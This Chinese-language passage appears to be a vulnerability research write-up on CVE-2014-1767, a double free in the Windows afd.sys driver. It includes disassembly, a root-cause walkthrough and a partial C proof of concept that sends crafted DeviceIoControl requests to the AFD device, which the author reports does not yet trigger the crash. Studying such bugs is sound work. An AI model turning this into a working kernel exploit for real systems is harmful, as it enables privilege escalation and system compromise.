
可以看到，第二次释放的调用链为：

```
AfdTransmitPackets -> AfdTliGetTpInfo -> AfdReturnTpInfo -> IoFreeMdl
```

此时我们如果再`g`一下，就会得到本文一开始一模一样的异常现场。

通过上面的调用链可以知道，第二次释放也是通过`AfdReturnTpInfo`最终触发的`IoFreeMdl`, 但是本次调用链上多了一个函数调用，即`AfdTliGetTpInfo`，让我们先看一下本函数的反汇编代码：

```
PAGE:0002B823 ; struc\_TPInfo \*\_\_fastcall AfdTliGetTpInfo(unsigned int a1)
PAGE:0002B823 @AfdTliGetTpInfo@4 proc near ; CODE XREF: AfdTransmitFile(x,x)+E4↓p
PAGE:0002B823 ; AfdTransmitPackets(x,x)+129↓p
PAGE:0002B823
PAGE:0002B823 Entry = dword ptr -1Ch
PAGE:0002B823 ms\_exc = CPPEH\_RECORD ptr -18h
PAGE:0002B823
PAGE:0002B823 ; \_\_unwind { // \_\_SEH\_prolog4
PAGE:0002B823 push 0Ch
PAGE:0002B825 push offset stru\_20998
PAGE:0002B82A call \_\_SEH\_prolog4
PAGE:0002B82F mov edi, ecx
PAGE:0002B831 mov eax, \_AfdGlobalData
PAGE:0002B836 add eax, 178h
PAGE:0002B83B push eax ; Lookaside
PAGE:0002B83C call \_ExAllocateFromNPagedLookasideList@4 ; ExAllocateFromNPagedLookasideList(x)
PAGE:0002B841 mov esi, eax
PAGE:0002B843 mov [ebp+Entry], esi
PAGE:0002B846 xor ecx, ecx
PAGE:0002B848 cmp esi, ecx
PAGE:0002B84A jnz short loc\_2B850
PAGE:0002B84C xor eax, eax
PAGE:0002B84E jmp short loc\_2B8B7
PAGE:0002B850 ; ---------------------------------------------------------------------------
PAGE:0002B850 loc\_2B850: ; CODE XREF: AfdTliGetTpInfo(x)+27↑j
PAGE:0002B850 mov [esi+8], ecx
PAGE:0002B853 lea eax, [esi+0Ch]
PAGE:0002B856 mov [eax], ecx
PAGE:0002B858 mov [esi+10h], eax
PAGE:0002B85B lea eax, [esi+14h]
PAGE:0002B85E mov [eax], ecx
PAGE:0002B860 mov [esi+18h], eax
PAGE:0002B863 mov [esi+34h], ecx
PAGE:0002B866 mov [esi+33h], cl
PAGE:0002B869 mov [esi+24h], ecx
PAGE:0002B86C or dword ptr [esi+2Ch], 0FFFFFFFFh
PAGE:0002B870 mov [esi+3Ch], ecx
PAGE:0002B873 mov [esi+4], ecx
PAGE:0002B876 cmp edi, \_AfdDefaultTpInfoElementCount
PAGE:0002B87C jbe short loc\_2B8B5
PAGE:0002B87E ; \_\_try { // \_\_except at loc\_2B89F
PAGE:0002B87E mov [ebp+ms\_exc.registration.TryLevel], ecx
PAGE:0002B881 push 0C6646641h ; Tag
PAGE:0002B886 imul edi, 18h
PAGE:0002B889 push edi ; NumberOfBytes
PAGE:0002B88A push 10h ; PoolType
PAGE:0002B88C call ds:\_\_imp\_\_ExAllocatePoolWithQuotaTag@12 ; ExAllocatePoolWithQuotaTag(x,x,x)
PAGE:0002B892 mov [esi+20h], eax
PAGE:0002B895 mov byte ptr [esi+32h], 1
PAGE:0002B899 jmp short loc\_2B8AE
PAGE:0002B89B ; ---------------------------------------------------------------------------
PAGE:0002B89B
PAGE:0002B89B loc\_2B89B: ; DATA XREF: .rdata:stru\_20998↑o
PAGE:0002B89B ; \_\_except filter // owned by 2B87E
PAGE:0002B89B xor eax, eax
PAGE:0002B89D inc eax
PAGE:0002B89E retn
PAGE:0002B89F ; ---------------------------------------------------------------------------
PAGE:0002B89F
PAGE:0002B89F loc\_2B89F: ; DATA XREF: .rdata:stru\_20998↑o
PAGE:0002B89F ; \_\_except(loc\_2B89B) // owned by 2B87E
PAGE:0002B89F mov esp, [ebp+ms\_exc.old\_esp]
PAGE:0002B8A2 push 1 ; flag
PAGE:0002B8A4 push [ebp+Entry] ; Entry
PAGE:0002B8A7 call \_AfdReturnTpInfo@8 ; AfdReturnTpInfo(x,x)
PAGE:0002B8AC xor esi, esi
PAGE:0002B8AC ; } // starts at 2B87E
PAGE:0002B8AE
PAGE:0002B8AE loc\_2B8AE: ; CODE XREF: AfdTliGetTpInfo(x)+76↑j
PAGE:0002B8AE mov [ebp+ms\_exc.registration.TryLevel], 0FFFFFFFEh
PAGE:0002B8B5
PAGE:0002B8B5 loc\_2B8B5: ; CODE XREF: AfdTliGetTpInfo(x)+59↑j
PAGE:0002B8B5 mov eax, esi
PAGE:0002B8B7
PAGE:0002B8B7 loc\_2B8B7: ; CODE XREF: AfdTliGetTpInfo(x)+2B↑j
PAGE:0002B8B7 call \_\_SEH\_epilog4
PAGE:0002B8BC retn
PAGE:0002B8BC ; } // starts at 2B823
PAGE:0002B8BC @AfdTliGetTpInfo@4 endp
```

结构上和上次的现场差不多，都包含一个异常处理，通过上面的调用链可知一定是`try`块中触发了异常才有可能调用到`AfdReturnTpInfo`, 那我们在`0002B88C`的`call`处下断点看一下现场（`0x10000`为`IDA`加载`afd.sys`的基址）：

![图片描述](upload/attach/202206/156241_U5TSED2PFSKFZPY.png)

根据`ExAllocatePoolWithQuotaTag`的定义：

```
PVOID ExAllocatePoolWithQuotaTag(
[in] __drv_strictTypeMatch(__drv_typeExpr)POOL_TYPE PoolType,
[in] SIZE_T NumberOfBytes,
[in] ULONG Tag
);
```

可知，目前正在尝试分配一块`4294967280`大小的内存（大约`3.9Gb`），由于被调试机器为`32`位且未开启`PAE`， 这种情况下必然会产生异常，因此会执行到`0002B8A7`处的`AfdReturnTpInfo`函数。

同时，需要注意，在`0002B83C`处从`LookasideList`内存处分配了一个`struc_TPInfo`后，并没有对`struc_TPInfo->struc_UnkObj`的`MdlAddress`成员初始化，因为在尝试调用`ExAllocatePoolWithQuotaTag`初始化该成员域时发生了异常（申请`3.9Gb`内存），从而执行流程跳转到了异常处理块的`AfdReturnTpInfo`处，但是`AfdReturnTpInfo`函数体中是会对`struc_TPInfo->struc_UnkObj->MdlAddress`执行释放操作的：

![图片描述](upload/attach/202206/156241_V796Y8YPZMDNZNZ.png)

那么由于此时分配的`struc_TPInfo`结构使用的内存是上一次调用`AfdTransmitFile`异常后，释放（归还）给`LookasidList`的内存，由于本文一开始分析得到的悬挂指针的问题， 导致二次`IoFreeMdl`同一块内存。

这就是本文一开始终极问题的答案——为什么会`DoubleFree`。

### 包袱2

同样埋一个包袱后文会用到。

让我们回到第二次释放时的调用现场：

![图片描述](upload/attach/202206/156241_VJXH8TZ289AVYN8.png)

通过对这个现场的回溯，我们可以得到第二次调用时的调用链如下：

`CVE-2014-1767 -> nt!DeviceIoControl -> afd!AfdTransmitPackets`

以及调用`DeviceIoControl`的参数信息：

控制码（Control Code): `0x120c3`

输入缓冲区地址：`0x1326200`

输入缓冲区长度：`0x18`

# DoubleFree产生流程总结

上文中，有个细节没有提到（下面标红部分）：

`AfdTliGetTpInfo`在分配`struc_TPInfo`结构时，会根据参数决定是否要初始化`struc_TPInfo->struc_UnkObj`结构。

`AfdTransmitFile`调用`AfdTliGetTpInfo`时，会用常数`3`作为参数进行调用，这导致`AfdTliGetTpInfo`永远不会在内部初始化`struc_TPInfo->struc_UnkObj`

`AfdTranmitPackets`调用`AfdTliGetTpInfo`时，使用的参数是可控的，并不是常数`3`，这导致我们可以控制`AfdTliGetTpInfo`让其在内部初始化`struc_TPInfo->struc_UnkObj`结构

知道了上述信息后，我们来覆盘一下`DoubleFree`产生的原因：

`AfdTransmitFile`调用（第一次`DeviceIoControl`）：

调用`AfdTliGetTpInfo`分配`struc_TPInfo`结构，此时调用`AfdTliGetTpInfo`参数固定为`3`，不初始化`struc_TPInfo->struc_UnkObj->MdlAddress`成员

调用`IoAllocateMdl`分配内存地址，赋值给`struc_TPInfo->struc_UnkObj->MdlAddress`成员

调用`MmProbeAndLockPages`尝试锁定`struc_TPInfo->struc_UnkObj->MdlAddress`，由于地址非法，发生异常

异常处理函数接管，调用`AfdReturnTpInfo`函数释放`struc_TPInfo`，但是未对指针置`NULL`从而产生悬挂指针

`AfdTransmitPackts`调用（第二次`DeviceIoControl`）：

调用`AfdTliGetTpInfo`分配`struc_TPInfo`结构，此时调用`AfdTliGetTpInfo`参数为外部传入，导致需要初始化`struc_TPInfo->struc_UnkObj->MdlAddress`成员

`AfdTliGetTpInfo`中尝试使用`ExAllocatePoolWithQuotaTag`分配`3.9Gb`内存，发生异常

异常处理函数接管，调用`AfdReturnTpInfo`清理刚分配的`struc_TPInfo`结构

由于本次分配的`struc_TPInfo`结构为`AfdTransmitFile`调用产生异常后释放（归还）给`LookasideList`的内存，这块内存包含上次指针的值（悬挂指针）

调用`IoFreeMdl`时尝试再次清理悬挂指针指向的内存区域

`BSOD`

# 构造POC

## 失败的尝试

本小节涉及到上文中提到的两个包袱，通过对栈中数据的分析我们可以写出如下`POC`代码：

```
#include <windows.h>
#include <ntdef.h>
#include <winternl.h>
#include <stdio.h>
typedef struct _INPUT_AfdTransmitFile {
DWORD field1;
DWORD field2;
DWORD field3;
DWORD field4;
DWORD field5;
DWORD field6;
DWORD field7;
DWORD field8;
DWORD field9;
DWORD field10;
DWORD field11;
DWORD field12;
} INPUT_AfdTransmitFile;
typedef struct _INPUT_AfdTransmitPackets {
DWORD field1;
DWORD field2;
DWORD field3;
DWORD field4;
DWORD field5;
DWORD field6;
} INPUT_AfdTransmitPackets;
int main()
{
DWORD bytesRet;
INPUT_AfdTransmitFile InputAfdTransmitFile = {0};
memset(&InputAfdTransmitFile, 0, sizeof(INPUT_AfdTransmitFile));
InputAfdTransmitFile.field7 = 0x13371337;
InputAfdTransmitFile.field8 = 0x15fcd9;
InputAfdTransmitFile.field11 = 1;
INPUT_AfdTransmitPackets InputAfdTransmitPackets = {0};
memset(&InputAfdTransmitPackets, 0, sizeof(INPUT_AfdTransmitPackets));
InputAfdTransmitPackets.field1 = 1;
InputAfdTransmitPackets.field2 = 0x0aaaaaaa;
LPCSTR deviceStr = "\\\\?\\GLOBALROOT\\Device\\Afd";
HANDLE hDevice = CreateFile( deviceStr, \
GENERIC_READ | GENERIC_WRITE | GENERIC_EXECUTE, \
FILE_SHARE_READ, \
NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
DeviceIoControl((HANDLE)hDevice, 0X1207F, (LPVOID)&InputAfdTransmitFile, \
sizeof(INPUT_AfdTransmitFile), NULL, 0, &bytesRet, NULL);
DeviceIoControl((HANDLE)hDevice, 0X120C3, (LPVOID)&InputAfdTransmitPackets, \
sizeof(INPUT_AfdTransmitPackets), NULL, 0, &bytesRet, NULL);
return 0;
}
```

测试发现，并不能触发崩溃，通过上面漏洞的成因， 分别在`afd!AfdTransmitFile`与`afd!AfdTransmitPackets`下断点进一步分析，最终发现是在`afd!AfdTransmitPackets`中如下检查未通过导致的：

```
FsContext = (unsigned __int8 *)a2->FileObject->FsContext;
v56 = FsContext;
v3 = *( _WORD *)FsContext;
if ( *( _WORD *)FsContext == 0x1AFD )
{
v66 = STATUS_INVALID_PARAMETER_12;
goto LABEL_148;
}
if ( v3 != (__int16)0xAFD2 <--- 这里的检查未通过导致直接调到函数结尾
&& (v3 != (__int16)0xAFD1 || (*(( _DWORD *)FsContext + 2) & 0x200) == 0 && (*(( _DWORD *)FsContext + 3) & 0x8000) == 0)
|| FsContext[2] != 4 )
```

通过对内核中`0xAFD2`常数的追踪， 最终定位到这个常数的位置如下图：
